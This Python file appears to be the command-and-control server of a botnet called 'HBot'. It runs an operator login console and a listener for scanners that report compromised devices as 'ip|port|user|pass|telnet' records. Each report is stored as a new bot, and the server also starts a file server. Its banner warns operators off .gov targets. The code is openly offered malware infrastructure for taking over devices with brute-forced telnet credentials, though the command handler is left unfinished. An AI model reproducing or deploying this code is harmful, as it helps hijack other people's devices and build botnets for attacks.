from utils_class import Connection, Database, Console
from threading import Thread
import socket, time, random

__LISTEN_MASTER_PORT__ = random.randint(1000, 60000)
__LISTEN_SCAN_PORT__ = random.randint(1000, 60000)
__PING_DELAY__ = 5
__MAX_MASTER__ = 10
__MAX_SCANNER__ = 1000
__CSTRING__ = '#conn_str#'

class Cache:
    def __init__(self):
        # Temp session storage
        self.connected_scanner = []
        self.connected_user = []

class Controller:
    def __init__(self, database: Database):
        pass

class MasterListener(Thread):
    def __init__(self, session: socket.socket, ip: str, database: Database.Database, console: Console.Console, cache: Cache):
        Thread.__init__(self)
        self.database = database
        self.console = console
        self.session = session
        self.cache = cache
        
        # Session status
        self.logged = False
        self.alive = True

        # Session info
        self.session_time = int(time.time())
        self.login_attemp = 0
        self.kicked_time = 0
        self.username = ''
        self.grade = ''
        self.ip = ip

        # Session class
        self.colors = Console.Color()
        #self.control = Controller(self.database)
        self.session = Connection.TcpConnection(session, ip)
        
    def kill(self, reason: str, send: bool= False):
        if self.alive:
            if self.session.kill_session(reason, send):
                if self in self.cache.connected_user:
                    self.cache.connected_user.remove(self)
                self.console.print_info(f'{self.ip} -> Master killed: {reason}')
                self.alive = False

    def send_packet(self, packets: list, new_line: bool= False):
        if self.session.send_packet(packets, new_line, 0):
            self.kill('Error when send packet')

    def recv_packet(self, content: str= False):
        data = self.session.recv_packet(content)

        if data == False:
            self.kill('Error when receiving a packet')
            return False
        else:
            return data

    def set_title(self, title: str):
        self.send_packet([f'\033]0;HBot | {title}\007'])

    def clear_screen(self):
        self.send_packet(['\033[2J\033[1H'])

    def send_banner(self):
        self.clear_screen()
        self.send_packet([
           '',
          f'\r{self.colors.reset}.▪   {self.colors.magenta} ▄ {self.colors.reset}.{self.colors.magenta}▄▄{self.colors.blue_m}▄▄▄{self.colors.reset}·{self.colors.blue_m}       ▄▄▄▄▄    {self.colors.magenta}*{self.colors.blue_m}-> {self.colors.orange}𝑍εпяσх{self.colors.blue_m}#{self.colors.orange}1337{self.colors.reset}',
            f'{self.colors.reset}   ▪  {self.colors.magenta}██{self.colors.reset}▪{self.colors.magenta}▐█{self.colors.blue_m}▐█ ▀█{self.colors.reset}▪▪{self.colors.blue_m}     {self.colors.reset}•{self.colors.blue_m}██     {self.colors.magenta}*{self.colors.blue_m}-> Version 0.0.1',  
            f'{self.colors.reset}.    {self.colors.magenta}██▀▐█{self.colors.blue_m}▐█▀▀█▄ ▄█▀▄  ▐█{self.colors.reset}.▪    {self.colors.magenta}*{self.colors.red}-> HIT .gov = ban{self.colors.reset}',
            f'{self.colors.reset}  ▪  {self.colors.magenta}██▌▐▀█{self.colors.blue_m}█▄{self.colors.reset}▪{self.colors.blue_m}▐█▐█▌{self.colors.reset}.{self.colors.blue_m}▐▌ ▐█▌{self.colors.reset}·    {self.colors.reset}.▪{self.colors.blue_m}   {self.colors.reset}▪{self.colors.blue_m}',
            f'{self.colors.reset}.  ▪ {self.colors.magenta}▀▀▀ {self.colors.reset}··{self.colors.blue_m}▀▀▀▀  ▀█▄▀{self.colors.reset}▪{self.colors.blue_m} ▀▀▀        {self.colors.reset}▪        .{self.colors.blue_m}',
            f'{self.colors.reset} .          .    ▪   ▪.     .▪\n\n\r'], True)

    def login(self):
        while self.alive:
            if self.login_attemp == 3:
                self.kill('Too many connection attempts, please try again later', True)
                break
            else:
                self.login_attemp += 1

            self.username = self.recv_packet(f'{self.colors.blue_m}>{self.colors.reset} {self.colors.underline}Username{self.colors.reset}: ')
            password = self.recv_packet(f'{self.colors.bright}{self.colors.blue_m}>{self.colors.reset} {self.colors.underline}Password{self.colors.reset}:{self.colors.invisible} ')

            if self.database.user_valid(self.username, password):
                self.grade = self.database.get_user(self.username)['grade']
                self.logged = True
                break
        
        return self.logged

    def prompt(self):
        while self.alive:
            command = self.recv_packet(f'\r{self.colors.reset}{self.username}{self.colors.blue_m}@{self.colors.reset}{self.colors.underline}HBot{self.colors.reset}{self.colors.magenta}$~{self.colors.reset} ')
            #self.control.handle_data(command, 'master', self)
            # idk why i have put thread btw ok | Thread(target= self.control.handle_data, args= (command, 'master', self)).start()

    def loop_thread(self):
        while self.alive:
            time.sleep(1)

            if self.logged:
                self.set_title(f'User: {len(self.cache.connected_user)} | Scanner: {len(self.cache.connected_scanner)}')
            else:
                self.kicked_time = int(time.time()) - self.session_time
                self.set_title(f'Login page | Attemp: {self.login_attemp}/3 | Kicked on: {self.kicked_time}/30s')

                if self.kicked_time >= 30:
                    self.kill('You did not connect in time !', True)

    def run(self):
        self.send_banner()
        Thread(target= self.loop_thread).start()
        self.cache.connected_user.append(self)

        if self.login():
            self.send_banner()
            self.send_packet([f'~> Welcome {self.colors.underline}{self.colors.bright}{self.username}{self.colors.reset}, Grade: {self.colors.green}{self.grade}{self.colors.reset}.', f'* Type "{self.colors.magenta}help{self.colors.reset}" to see commands and "{self.colors.magenta}exit{self.colors.reset}" to disconnect.\n'], True)
            self.prompt()

class ScannerListener(Thread):
    def __init__(self, session: socket.socket, ip: str, database: Database.Database, console: Console.Console, cache: Cache):
        self.session = Connection.TcpConnection(session, ip)
        self.console = console
        self.database = database
        Thread.__init__(self)
        self.alive = True
        self.cache = cache
        self.ip = ip

    def kill(self, reason: str):
        if self.alive:
            if self.session.kill_session(reason, False):
                if self in self.cache.connected_scanner:
                    self.cache.connected_scanner.remove(self)

                self.console.print_info(f'{self.ip} -> Scanner killed: {reason}')
                self.alive = False

    def send_packet(self, packets: list):
        if self.session.send_packet(packets, False, 0):
            self.kill('Error when send packet')

    def recv_packet(self):
        data = self.session.recv_packet(False)

        if data == False:
            self.kill('Error when receiving a packet')
            return False
        else:
            return data

    def ping_thread(self):
        while True:
            time.sleep(__PING_DELAY__)
            self.send_packet(['ping'])

    def run(self):
        Thread(target= self.ping_thread).start()
        self.cache.connected_scanner.append(self)

        while self.alive:
            data = str(self.recv_packet())

            if not '|' in data:
                return

            args = data.split('|')
            
            # scan|127.0.0.1|23|user|pass|telnet
            if args[0] == 'scan':
                ip = args[1]
                port = args[2]
                username = args[3]
                password = args[4]
                device_type = args[5]

                count = self.database.create_bot(username, password, ip, port, device_type)
                self.console.print_success(f'{self.ip} -> New {device_type} bot "{username}:{password} {ip}:{port}" -> {count} bots')

class Router():
    def __init__(self, console: Console.Console, cache: Cache):
        self.database = Database.Database(__CSTRING__)
        self.console = console
        self.cache = cache
    
    def start_scanner_listener(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', __LISTEN_SCAN_PORT__))

        self.console.print_info(f'Listenner -> Scanner -> Max: {__MAX_SCANNER__} -> open on port: {__LISTEN_SCAN_PORT__}')

        while True:
            sock.listen(__MAX_SCANNER__)
            (session, (ip, port)) = sock.accept()
            ScannerListener(session, ip, self.database, self.console, self.cache).start()
    
    def start_master_listener(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', __LISTEN_MASTER_PORT__))

        self.console.print_info(f'Listenner -> Master -> Max: {__MAX_MASTER__} -> open on port: {__LISTEN_MASTER_PORT__}')

        while True:
            sock.listen(__MAX_MASTER__)
            (session, (ip, port)) = sock.accept()
            MasterListener(session, ip, self.database, self.console, self.cache).start()
    
    def start(self):
        Thread(target= self.start_scanner_listener).start()
        Thread(target= self.start_master_listener).start()

if __name__ == '__main__':
    console = Console.Console()
    cache = Cache()
    
    # Run all services
    console.cnc_banner()
    Router(console, cache).start()
    Connection.FileServer(console).start()